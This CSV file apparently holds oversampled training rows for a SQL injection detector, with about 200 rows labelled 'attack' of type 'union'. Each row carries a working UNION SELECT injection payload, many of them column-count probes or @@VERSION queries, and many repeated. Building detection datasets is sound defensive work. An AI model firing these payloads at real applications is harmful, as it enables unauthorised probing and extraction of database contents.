id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000532,attack,union,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",nearest_attack_euclidean,R000078,0.6788426157239198
SMOTE_000533,attack,union,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",nearest_attack_euclidean,R000078,1.5951130228114658
SMOTE_000534,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000056,1.6965445120335207
SMOTE_000535,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,1.1715953779553534
SMOTE_000536,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000073,0.4223065246436436
SMOTE_000537,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000019,1.2956698431353468
SMOTE_000538,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000006,0.29095215086525505
SMOTE_000539,attack,union,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",nearest_attack_euclidean,R000076,0.7067005959739988
SMOTE_000540,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000060,0.3971838478176162
SMOTE_000541,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000059,0.8993535521082696
SMOTE_000542,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000073,0.6934969960835333
SMOTE_000543,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000027,1.8056057752360781
SMOTE_000544,attack,union,"-4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986#",nearest_attack_euclidean,R000051,0.11687057388033363
SMOTE_000545,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000064,0.02391368655115712
SMOTE_000546,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R000063,0.09837591093780697
SMOTE_000547,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,0.16721646747524546
SMOTE_000548,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000005,1.72215598571954
SMOTE_000549,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,0.7540048491681733
SMOTE_000550,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000064,0.48202003547509475
SMOTE_000551,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000077,1.1783154329449952
SMOTE_000552,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000064,1.062992702143734
SMOTE_000553,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R000063,0.10312953818101957
SMOTE_000554,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000021,0.7739408563030044
SMOTE_000555,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000038,0.0314145927757644
SMOTE_000556,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000018,0.9765972809897228
SMOTE_000557,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000042,0.47974051420395153
SMOTE_000558,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000048,1.2073545962597325
SMOTE_000559,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000017,0.6127444538856056
SMOTE_000560,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000011,2.116646834387205
SMOTE_000561,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000043,1.6083827589976871
SMOTE_000562,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,0.6531594006441207
SMOTE_000563,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,0.9003163833181657
SMOTE_000564,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000001,0.609522526909672
SMOTE_000565,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000011,0.14624541840364533
SMOTE_000566,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000019,1.7116061107765612
SMOTE_000567,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,1.33250419458017
SMOTE_000568,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000006,0.1468976298204397
SMOTE_000569,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000059,0.7575563014852562
SMOTE_000570,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000073,0.8334131681411361
SMOTE_000571,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000023,1.2272615826425988
SMOTE_000572,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000002,1.9007935272695222
SMOTE_000573,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000028,0.6344102206361445
SMOTE_000574,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,0.7921718071406108
SMOTE_000575,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000022,1.1218899273735203
SMOTE_000576,attack,union,1'  )   as gogu where 4338  =  4338 union all select null#,nearest_attack_euclidean,R000040,2.023290346401035
SMOTE_000577,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,0.5388527245925212
SMOTE_000578,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000028,0.4882388990877609
SMOTE_000579,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000010,0.8442072330661748
SMOTE_000580,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000011,0.4881206156460605
SMOTE_000581,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000071,0.1632712313010818
SMOTE_000582,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000064,1.6107833318414724
SMOTE_000583,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000027,0.41302431844811505
SMOTE_000584,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000025,1.8259021808566747
SMOTE_000585,attack,union,"1%""   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000065,1.3166386927953067
SMOTE_000586,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,0.714682979118302
SMOTE_000587,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000075,0.10653714399955219
SMOTE_000588,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000041,1.8571076691415895
SMOTE_000589,attack,union,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",nearest_attack_euclidean,R000024,0.6483801091347069
SMOTE_000590,attack,union,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",nearest_attack_euclidean,R000024,0.9737461377208163
SMOTE_000591,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000077,1.3035732525965473
SMOTE_000592,attack,union,"1%' union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000032,0.046968041227350155
SMOTE_000593,attack,union,"1%""   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000044,1.0143128594616302
SMOTE_000594,attack,union,"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",nearest_attack_euclidean,R000055,0.23205421752085464
SMOTE_000595,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000031,0.5702857579942591
SMOTE_000596,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,0.6878769730961398
SMOTE_000597,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000025,0.6260533003058015
SMOTE_000598,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000036,1.1963761905483201
SMOTE_000599,attack,union,"1%""   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000044,1.6803064011926387
SMOTE_000600,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000002,0.14873881933564254
SMOTE_000601,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,0.2849455622601325
SMOTE_000602,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000027,0.07797923251949024
SMOTE_000603,attack,union,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",nearest_attack_euclidean,R000076,1.0082742450376776
SMOTE_000604,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000025,0.16937797148727657
SMOTE_000605,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000054,1.3179833270827352
SMOTE_000606,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000038,0.6112178797475911
SMOTE_000607,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000017,1.0054461060155497
SMOTE_000608,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000050,0.5127524735746484
SMOTE_000609,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000073,0.6008526924394135
SMOTE_000610,attack,union,1'  )   as gogu where 4338  =  4338 union all select null#,nearest_attack_euclidean,R000040,1.3588992673211495
SMOTE_000611,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,1.841206271308984
SMOTE_000612,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,1.0077408439514244
SMOTE_000613,attack,union,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",nearest_attack_euclidean,R000024,1.2782172603399895
SMOTE_000614,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000041,0.13357004985846382
SMOTE_000615,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000070,1.5237143883082154
SMOTE_000616,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000006,1.2869148539432786
SMOTE_000617,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000018,1.6032496780753125
SMOTE_000618,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000060,0.7874756792855448
SMOTE_000619,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R000063,0.6307149508607658
SMOTE_000620,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000060,0.7936918712573805
SMOTE_000621,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000029,1.3804819439532687
SMOTE_000622,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,0.43548861739863065
SMOTE_000623,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000071,1.5945022548076349
SMOTE_000624,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000041,0.4107578044830463
SMOTE_000625,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000070,1.4465746136431588
SMOTE_000626,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000058,0.6253539418093179
SMOTE_000627,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,1.0444958936251894
SMOTE_000628,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000077,0.9188532423766799
SMOTE_000629,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000003,1.1254125699474085
SMOTE_000630,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,1.0686526008587998
SMOTE_000631,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000031,0.8835537482421351
SMOTE_000632,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000005,0.8591030603684763
SMOTE_000633,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000022,0.22454603938722217
SMOTE_000634,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000050,0.46186810991651117
SMOTE_000635,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000018,0.6567180290743693
SMOTE_000636,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000062,0.9815467612738566
SMOTE_000637,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000077,2.046396158870401
SMOTE_000638,attack,union,1'  )   as gogu where 4338  =  4338 union all select null#,nearest_attack_euclidean,R000040,0.9391206197420905
SMOTE_000639,attack,union,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",nearest_attack_euclidean,R000024,0.965438054270411
SMOTE_000640,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R000063,0.22208075496349472
SMOTE_000641,attack,union,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",nearest_attack_euclidean,R000024,1.0545485773903895
SMOTE_000642,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000049,0.5436078356951259
SMOTE_000643,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000019,1.308414943561157
SMOTE_000644,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000049,1.6209934577607996
SMOTE_000645,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000058,0.913684616731487
SMOTE_000646,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000064,0.74103298217407
SMOTE_000647,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,0.8850815272160739
SMOTE_000648,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000070,0.21264486467909244
SMOTE_000649,attack,union,"1%""   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000044,0.8941399597666598
SMOTE_000650,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000075,1.1979477232972393
SMOTE_000651,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000054,1.183510648100255
SMOTE_000652,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000003,0.03295897511696244
SMOTE_000653,attack,union," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000007,2.098793501634562
SMOTE_000654,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000042,0.3147999650405993
SMOTE_000655,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000011,0.7292257381069714
SMOTE_000656,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000077,0.773347062597153
SMOTE_000657,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000002,1.8914792673268617
SMOTE_000658,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000023,0.13667614202800998
SMOTE_000659,attack,union,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",nearest_attack_euclidean,R000024,1.0116321240894866
SMOTE_000660,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000064,0.8114334643194381
SMOTE_000661,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,0.7086688666255457
SMOTE_000662,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000061,1.519462278204365
SMOTE_000663,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000064,0.13191484214622654
SMOTE_000664,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000036,0.8185241189843556
SMOTE_000665,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000006,1.875432578264839
SMOTE_000666,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,0.2844009230478677
SMOTE_000667,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000077,1.6318054637246726
SMOTE_000668,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000052,0.549247981080692
SMOTE_000669,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000020,1.5081115659256592
SMOTE_000670,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000036,0.8704139622136277
SMOTE_000671,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000077,0.6114247048199094
SMOTE_000672,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000064,1.3241314188229645
SMOTE_000673,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000054,1.1634204000671988
SMOTE_000674,attack,union,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",nearest_attack_euclidean,R000078,0.9582764268859673
SMOTE_000675,attack,union,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",nearest_attack_euclidean,R000078,1.0178895617595605
SMOTE_000676,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R000063,1.2952984980484075
SMOTE_000677,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,2.4164713402384823
SMOTE_000678,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000070,1.3779772947904092
SMOTE_000679,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000017,1.6457950241935964
SMOTE_000680,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000041,0.3580835567457224
SMOTE_000681,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000031,1.0825573991781385
SMOTE_000682,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000017,0.22717410340247
SMOTE_000683,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000054,1.3937249804428513
SMOTE_000684,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000005,1.691874726549725
SMOTE_000685,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000042,0.8523740048171797
SMOTE_000686,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,1.1427713471869876
SMOTE_000687,attack,union,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",nearest_attack_euclidean,R000074,0.38244135742451013
SMOTE_000688,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000027,0.806886726006248
SMOTE_000689,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000043,0.389667560204178
SMOTE_000690,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000026,0.08273369358688419
SMOTE_000691,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000041,0.01570292213948483
SMOTE_000692,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,0.16787341977039813
SMOTE_000693,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000028,0.2762943476239731
SMOTE_000694,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000019,1.770406924658191
SMOTE_000695,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000005,1.0427392229951475
SMOTE_000696,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R000063,0.12956350495651547
SMOTE_000697,attack,union,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",nearest_attack_euclidean,R000024,0.9618320766530382
SMOTE_000698,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000043,0.6431716472987659
SMOTE_000699,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000028,0.1445160392108068
SMOTE_000700,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,0.4447437542332085
SMOTE_000701,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000026,0.5805883245819908
SMOTE_000702,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000042,0.2942052303986969
SMOTE_000703,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000048,1.168521099981357
SMOTE_000704,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000060,0.39852202312582197
SMOTE_000705,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000070,1.4915518331582223
SMOTE_000706,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,1.2850186104897914
SMOTE_000707,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000002,1.8759160131249226
SMOTE_000708,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000050,1.2700577192551161
SMOTE_000709,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000069,1.6526876483320163
SMOTE_000710,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000059,1.0931651575666785
SMOTE_000711,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,1.9731222969293107
SMOTE_000712,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000006,0.23051113338602858
SMOTE_000713,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000002,0.3523869812742001
SMOTE_000714,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000061,0.4896949116088232
SMOTE_000715,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000058,0.25199571029213
SMOTE_000716,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000050,1.2890324945289982
SMOTE_000717,attack,union,"-4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986#",nearest_attack_euclidean,R000051,0.4800117374620564
SMOTE_000718,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000054,0.8923633184264733
SMOTE_000719,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000036,0.2612130695524785
SMOTE_000720,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000003,0.3015049214566264
SMOTE_000721,attack,union,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",nearest_attack_euclidean,R000074,0.6734185552463761
SMOTE_000722,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000038,0.09485747716902534
SMOTE_000723,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000059,1.445762487063029
SMOTE_000724,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,1.5457940515879875
SMOTE_000725,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000042,0.8985107826714539
SMOTE_000726,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000036,0.2731787127361462
SMOTE_000727,attack,union," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000008,0.056412918962807666
SMOTE_000728,attack,union,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",nearest_attack_euclidean,R000078,0.30539501017871185
SMOTE_000729,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000028,0.2255231004999616
SMOTE_000730,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000038,0.37259659423123787
SMOTE_000731,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000056,0.9139348285594329
